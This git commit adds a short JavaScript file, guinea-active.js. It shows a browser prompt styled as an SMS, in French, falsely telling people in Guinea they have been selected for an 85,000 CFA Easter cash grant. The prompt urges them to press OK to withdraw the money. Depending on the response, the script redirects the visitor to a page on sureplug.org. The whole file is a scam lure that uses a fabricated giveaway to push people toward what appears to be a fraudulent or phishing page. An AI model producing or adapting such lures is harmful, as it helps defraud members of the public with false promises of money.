d1374a1d9af36571d08d79e74aedf4219bc70cb5
surepluger <adigunkola666@gmail.com>
2025-04-18 07:14:30 +0100

    Create guinea-active.js

---
+++ guinea-active.js
@@ -0,0 +1,5 @@
+var password = 'RETIRER 85 000 CFA'
+password=prompt('SMS: Félicitations, vous faites partie des Guinée sélectionnés pour recevoir 85 000 CFA en guise de subvention en espèces pour la célébration de Pâques. Appuyez sur OK pour retirer maintenant ','RETIRER 85 000 CFA');
+if (password != 'RETIRER 85 000 CFA') {
+location.href='https://sureplug.org/guinea-easter.html';
+}
